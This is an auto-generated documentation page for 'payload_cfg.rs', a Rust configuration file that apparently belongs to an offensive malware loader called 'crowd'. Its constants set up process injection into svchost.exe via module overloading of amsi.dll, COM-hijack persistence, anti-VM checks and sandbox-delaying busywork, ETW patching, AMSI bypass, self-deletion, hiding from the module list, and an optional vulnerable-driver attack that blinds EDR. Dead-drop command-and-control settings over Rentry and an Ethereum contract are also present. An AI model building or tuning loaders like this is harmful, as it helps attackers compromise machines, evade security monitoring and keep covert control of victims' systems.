# crowd — payload_cfg.rs

| Field | Value |
|-------|-------|
| **Source** | `src/dark_crystal/crowd/src/payload_cfg.rs` |
| **Lines** | 199 |
| **Cards** | T022-architecture |
| **Role** | Compile-time payload constants |

## Purpose

# crowd — payload_cfg.rs

AUTO-GENERADO por crowd_builder.py — NO EDITAR MANUALMENTE
Generado: 2026-04-28T23:11:16

Cadena:
Anti-VM=True | Hammer=True | AMSI-HBP=ON | ETW=True
Block-DLL=True | PPID-auto=True | Sleep=3000ms
Inject: Module Overloading → C:\\Windows\\System32\\amsi.dll

## Constants

- `KEY`: `[u8; 32]` = `[0x2a, 0x56, 0x62, 0x60, 0xf3, 0x75, 0xee, 0x6e, 0x83, 0x5d, 0xe7, 0xf8, 0xcf, 0xae, 0x1b, 0x18, 0x04, 0x39, 0x4a, 0xd3, 0x2d, 0x02, 0x00, 0xe6, 0x71, 0xa3, 0xb8, 0xc9, 0x98, 0x39, 0x41, 0x66]`
- `INJECTION_TYPE`: `&str` = `"module_overload"`
- `HIJACK_PID`: `u32` = `0`
- `INJECTION_TARGET_EXE`: `&str` = `r"C:\\Windows\\System32\\svchost.exe"`
- `PE_COMPILER`: `&str` = `"unknown"`
- `PERSIST_ENABLED`: `bool` = `true`
- `PERSIST_METHODS`: `&str` = `"com_hijack"`
- `PAYLOAD`: `&[u8]` = `&[]`
- `OVERLOAD_DLL`: `&str` = `r"C:\\Windows\\System32\\amsi.dll"`
- `GHOST_MASQUERADE`: `&str` = `r"C:\\Windows\\System32\\svchost.exe"`
- `STOMP_DLL`: `&str` = `"amsi.dll"`
- `STOMP_EXPORT`: `&str` = `"DllGetClassObject"`
- `PPID_AUTO`: `bool` = `true`
- `SLEEP_MS`: `u64` = `3000`
- `ANTI_VM`: `bool` = `true`
- `HAMMER_ENABLED`: `bool` = `true`
- `HAMMER_SEED`: `u32` = `0x1337cafe`
- `HAMMER_ITERS`: `u32` = `0`
- `HAMMER_SECS`: `u64` = `0`
- `ETW_PATCH`: `bool` = `true`
- `BLOCK_DLL`: `bool` = `true`
- `SELF_DELETE`: `bool` = `true`
- `STOMP_HEADER`: `bool` = `true`
- `PEB_UNLINK`: `bool` = `true`
- `BLOCK_HANDLE`: `bool` = `true`
- `USE_THREADLESS`: `bool` = `true`
- `DECOY_ARGS`: `&str` = `""`
- `REAL_ARGS`: `&str` = `""`
- `BYOVD_ENABLED`: `bool` = `false`
- `VEH_SYSCALLS`: `bool` = `false`
- `IAT_CAMO_PROFILE`: `u32` = `0`
- `AMSI_PAGE_GUARD`: `bool` = `false`
- `HELLS_GATE`: `bool` = `false`
- `MAPPING_INJECT`: `bool` = `false`
- `EARLY_CASCADE`: `bool` = `false`
- `WAITING_THREAD`: `bool` = `false`
- `NT_CREATE_PROCESS`: `bool` = `false`
- `REFLECTIVE_PE`: `bool` = `false`
- `MEGADEBUG_LOG_PATH`: `&str` = `""`
- `EDO_ENABLED`: `bool` = `false`
- `EDO_MAX_GENERATIONS`: `u32` = `0`
- `EDO_SOUL_STORAGE`: `&str` = `""`
- `EDO_CHAIN_LEN`: `usize` = `0`
- `EDO_INJECTION`: `&[&str]` = `&[]`
- `EDO_EVASION`: `&[&str]` = `&[]`
- `EDO_SYSCALL_BACKEND`: `&[&str]` = `&[]`
- `EDO_PERSIST_METHOD`: `&[&str]` = `&[]`
- `EDO_SLEEP_MS`: `&[u64]` = `&[]`
- `EDO_DROP_ENABLED`: `bool` = `false`
- `EDO_DROP_GT_SLUG`: `&str` = `""`
- `EDO_DROP_AES_KEY`: `[u8; 32]` = `[0u8`
- `EDO_DROP_CONTRACT_ADDR`: `&str` = `""`
- `EDO_DROP_RPC_URLS`: `&[&str]` = `&[]`
- `EDO_DROP_WALLET_KEY`: `&str` = `""`
- `EDO_DROP_POLL_MS`: `u64` = `300000`
- `EDO_DROP_JITTER_MS`: `u64` = `60000`

## Full Source

```rust
        //! # crowd — payload_cfg.rs
        //!
        //! AUTO-GENERADO por crowd_builder.py — NO EDITAR MANUALMENTE
        //! Generado: 2026-04-28T23:11:16
        //!
        //! Cadena:
        //!   Anti-VM=True | Hammer=True | AMSI-HBP=ON | ETW=True
        //!   Block-DLL=True | PPID-auto=True | Sleep=3000ms
        //!   Inject: Module Overloading → C:\\Windows\\System32\\amsi.dll

        #![allow(dead_code, unused)]

        /// AES-256 key (32 bytes). Todo-cero = sin cifrado.
        pub const KEY: [u8; 32] = [0x2a, 0x56, 0x62, 0x60, 0xf3, 0x75, 0xee, 0x6e, 0x83, 0x5d, 0xe7, 0xf8, 0xcf, 0xae, 0x1b, 0x18, 0x04, 0x39, 0x4a, 0xd3, 0x2d, 0x02, 0x00, 0xe6, 0x71, 0xa3, 0xb8, 0xc9, 0x98, 0x39, 0x41, 0x66];

        /// AES-256 nonce is embedded in the ciphertext (first 12B). No standalone IV constant.

        /// Injection technique to use. Values: "process_ghost" | "module_overload" | "function_stomp" | "thread_hijack" | "auto"
        pub const INJECTION_TYPE: &str = "module_overload";

        /// PID of process to hijack for Thread Hijacking (0 = find suitable target at runtime).
        pub const HIJACK_PID: u32 = 0;

        /// Target executable for Tsukuyomi Tier A techniques (Early Bird, Hypnosis, etc.).
        /// Used as the sacrificial process to create suspended and inject into.
        pub const INJECTION_TARGET_EXE: &str = r"C:\\Windows\\System32\\svchost.exe";

        /// PE compiler/language detected by crowd_builder.py.
        /// Values: "go" | "rust" | "dotnet" | "cpp" | "unknown"
        pub const PE_COMPILER: &str = "unknown";

        /// Enable Fase 6 persistence mechanisms at runtime.
        pub const PERSIST_ENABLED: bool = true;

        /// Comma-separated list of persistence methods to install (empty = install all).
        /// Valid values: "com_hijack", "ntfs_ea", "schtask", "tls_cb"
        pub const PERSIST_METHODS: &str = "com_hijack";

        /// Sin payload embebido — crowd carga desde --payload en runtime
pub const PAYLOAD: &[u8] = &[];

        /// DLL target para Module Overloading (vacio = Process Ghosting automatico para PE >= 35MB).
        pub const OVERLOAD_DLL: &str = r"C:\\Windows\\System32\\amsi.dll";

        /// Ruta del proceso de masquerade para Process Ghosting.
        /// chain.rs usa este valor como ImagePathName del proceso ghosted.
        pub const GHOST_MASQUERADE: &str = r"C:\\Windows\\System32\\svchost.exe";

        /// DLL target para Function Stomping.
        pub const STOMP_DLL: &str = "amsi.dll";

        /// Export a stompar.
        pub const STOMP_EXPORT: &str = "DllGetClassObject";

        /// PPID auto-detect explorer.exe.
        /// Para Process Ghosting: se pasa directamente a NtCreateProcessEx como parent.
        pub const PPID_AUTO: bool = true;

        /// Sleep Ekko en ms (post-inyeccion).
        pub const SLEEP_MS: u64 = 3000;

        // ── Evasion toggles (wired from builder UI) ─────────────────────

        /// Anti-VM checks enabled (CPUID, RDTSC, hypervisor flags).
        pub const ANTI_VM: bool = true;

        /// API Hammering enabled (delay sandbox via FPU/SIMD busywork).
        pub const HAMMER_ENABLED: bool = true;

        /// Seed for API Hammering (0 = skip).
        pub const HAMMER_SEED: u32 = 0x1337cafe;

        /// Iterations for FPU/SIMD hammering (0 = default 3M).
        pub const HAMMER_ITERS: u32 = 0;

        /// Minimum seconds for hammering to run (0 = default 2s).
        pub const HAMMER_SECS: u64 = 0;

        /// ETW muffling enabled.
        pub const ETW_PATCH: bool = true;

        /// Block-DLL policy (ProcessDynamicCodePolicy).
        pub const BLOCK_DLL: bool = true;

        /// Self-delete binary from disk after execution.
        pub const SELF_DELETE: bool = true;

        /// PE Header Stomp (zero PE headers in memory).
        pub const STOMP_HEADER: bool = true;

        /// PEB Module Unlink (hide from PEB loader list).
        pub const PEB_UNLINK: bool = true;

        /// BlockHandle SDDL (restrict handle access via security descriptor).
        pub const BLOCK_HANDLE: bool = true;

        /// Use Threadless injection as first attempt in injection chain.
        pub const USE_THREADLESS: bool = true;

        /// Decoy command line arguments for Argument Spoofing.
        pub const DECOY_ARGS: &str = "";

        /// Real command line arguments for Argument Spoofing.
        pub const REAL_ARGS: &str = "";

        // ── Phase 1+2: New S/A-tier technique toggles ──────────────────

        /// BYOVD Evasion — load vulnerable driver to blind EDR sensors.
        /// Requires embedded driver bytes (empty = skip).
        pub const BYOVD_ENABLED: bool = false;

        /// VEH Gate — use Vectored Exception Handler for syscall dispatch.
        /// Alternative to RecycledGate for environments where indirect syscalls are flagged.
        pub const VEH_SYSCALLS: bool = false;

        /// IAT Camouflage — inject benign imports to mislead ML classifiers.
        /// Profile level: 0=off, 3=basic(gdi+winmm), 4=network(+wininet+crypt32), 5=full(+ole32+shell32).
        pub const IAT_CAMO_PROFILE: u32 = 0;

        /// AMSI Bypass via PAGE_GUARD (alternative to HBP when DR0 is occupied).
        pub const AMSI_PAGE_GUARD: bool = false;

        /// Hells/Halos/Tartarus Gate — dynamic SSN resolution on hooked ntdll.
        /// Fallback for resolve.rs cascade when standard methods fail.
        pub const HELLS_GATE: bool = false;

        /// Mapping Injection — NtCreateSection+NtMapViewOfSection (avoids NtWriteVirtualMemory).
        pub const MAPPING_INJECT: bool = false;

        /// Early Cascade Injection — APC during process initialization window.
        pub const EARLY_CASCADE: bool = false;

        /// WaitingThread Hijacking — hijack WAIT-state threads only (crash-safe).
        pub const WAITING_THREAD: bool = false;

        /// NtCreateUserProcess — NT-level process creation (replaces CreateProcessW).
        pub const NT_CREATE_PROCESS: bool = false;

        /// Reflective PE Loader — manual PE mapping without LoadLibrary.
        pub const REFLECTIVE_PE: bool = false;

        /// MEGADEBUG: File path for debug log output (empty = %TEMP%\crowd_megadebug.log).
        /// Set by crowd_builder.py --mega-debug-log-path.
        pub const MEGADEBUG_LOG_PATH: &str = "";

        // ── Edo Tensei: Polymorphic Resurrection Engine ────────────────────

        /// Whether Edo Tensei resurrection is enabled.
        pub const EDO_ENABLED: bool = false;

        /// Maximum generations before wrapping to 0.
        pub const EDO_MAX_GENERATIONS: u32 = 0;

        /// Soul storage backend: "ntfs_ea" | "registry" | "env_var" | "ads"
        pub const EDO_SOUL_STORAGE: &str = "";

        /// Number of generations in the chain.
        pub const EDO_CHAIN_LEN: usize = 0;

        /// Per-generation injection technique.
        pub const EDO_INJECTION: &[&str] = &[];

        /// Per-generation evasion IDs (comma-separated per entry).
        pub const EDO_EVASION: &[&str] = &[];

        /// Per-generation syscall backend.
        pub const EDO_SYSCALL_BACKEND: &[&str] = &[];

        /// Per-generation persist method.
        pub const EDO_PERSIST_METHOD: &[&str] = &[];

        /// Per-generation sleep duration in ms.
        pub const EDO_SLEEP_MS: &[u64] = &[];

        // ── Edo Dead Drop: Autonomous C2 Channels ─────────────────────────

        /// Master toggle for dead drop polling.
        pub const EDO_DROP_ENABLED: bool = false;

        /// Rentry.co slug for Google Translate proxy channel.
        pub const EDO_DROP_GT_SLUG: &str = "";

        /// AES-256 key for dead drop payloads (32 bytes). Separate from main KEY.
        pub const EDO_DROP_AES_KEY: [u8; 32] = [0u8; 32];

        /// Ethereum contract address for blockchain channel (hex, 0x-prefixed).
        pub const EDO_DROP_CONTRACT_ADDR: &str = "";

        /// JSON-RPC endpoints for blockchain reads (fallback order).
        pub const EDO_DROP_RPC_URLS: &[&str] = &[];

        /// Wallet private key for blockchain writes (hex, 64 chars, no 0x).
        pub const EDO_DROP_WALLET_KEY: &str = "";

        /// Base polling interval in ms.
        pub const EDO_DROP_POLL_MS: u64 = 300000;

        /// Jitter range in ms (+/- from base interval).
        pub const EDO_DROP_JITTER_MS: u64 = 60000;

```